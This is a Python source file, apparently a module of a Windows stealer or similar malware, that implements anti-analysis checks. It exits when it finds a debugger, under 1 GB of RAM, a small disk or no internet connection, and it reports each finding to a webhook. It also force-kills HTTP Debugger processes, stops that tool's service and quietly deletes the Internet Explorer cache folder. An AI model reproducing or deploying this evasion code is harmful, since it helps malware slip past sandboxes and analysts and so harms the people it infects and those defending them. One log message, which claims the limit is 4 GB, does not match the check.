import time
import sys
import ctypes
import os

import win32api

from ..utils.http import hasInternet
from ..utils.webhook import Webhook

class Miscellanoeus:
	def __init__(self, webhook_url: str):
		self.webhook_url = webhook_url
		self.webhook = Webhook(self.webhook_url)

	def CheckInternet(self):
		while True:
			try:
				time.sleep(5)
				if hasInternet() == False:
					os._exit(1)
				else:
					pass
			except:
				pass
			
	def CheckRam(self):
		class MEMORYSTATUSEX(ctypes.Structure):
			_fields_ = [
				("dwLength", ctypes.c_ulong),
				("dwMemoryLoad", ctypes.c_ulong),
				("ullTotalPhys", ctypes.c_ulonglong),
				("ullAvailPhys", ctypes.c_ulonglong),
				("ullTotalPageFile", ctypes.c_ulonglong),
				("ullAvailPageFile", ctypes.c_ulonglong),
				("ullTotalVirtual", ctypes.c_ulonglong),
				("ullAvailVirtual", ctypes.c_ulonglong),
				("sullAvailExtendedVirtual", ctypes.c_ulonglong),
			]

		memoryStatus = MEMORYSTATUSEX()
		memoryStatus.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
		ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(memoryStatus))

		if memoryStatus.ullTotalPhys / 1073741824 < 1:
			self.webhook.send(f"Ram Check: Less than 4 GB of RAM exists on this system", "Miscellaneous")
			os._exit(1)

	def IsDebuggerPresent(self):
		isDebuggerPresent = ctypes.windll.kernel32.IsDebuggerPresent()

		if (isDebuggerPresent):
			self.webhook.send(f"IsDebuggerPresent: A debugger is present, exiting program...","Miscellaneous")
			os._exit(1)

		if ctypes.windll.kernel32.CheckRemoteDebuggerPresent(ctypes.windll.kernel32.GetCurrentProcess(), False) != 0:
			self.webhook.send("CheckRemoteDebuggerPresent: A debugger is present, exiting program...", "Miscellaneous")
			os._exit(1)
			
	def CheckDiskSize(self):
		minDiskSizeGB = 50
		if len(sys.argv) > 1: minDiskSizeGB = float(sys.argv[1])
		_, diskSizeBytes, _ = win32api.GetDiskFreeSpaceEx()
		diskSizeGB = diskSizeBytes/1073741824

		if diskSizeGB < minDiskSizeGB:
			self.webhook.send(f"Disk Check: The disk size of this host is {diskSizeGB} GB, which is less than the minimum {minDiskSizeGB} GB")
			os._exit(1)
			
	def KillTasks(self):
		os.system("taskkill /f /im HTTPDebuggerUI.exe >nul 2>&1")
		os.system("taskkill /f /im HTTPDebuggerSvc.exe >nul 2>&1")
		os.system("sc stop HTTPDebuggerPro >nul 2>&1")
		os.system("cmd.exe /c @RD /S /Q \"C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\" >nul 2>&1")
			

	def StartChecks(self):
		self.CheckRam(), self.IsDebuggerPresent(), self.CheckDiskSize(), self.KillTasks()
		
		self.CheckInternet()
				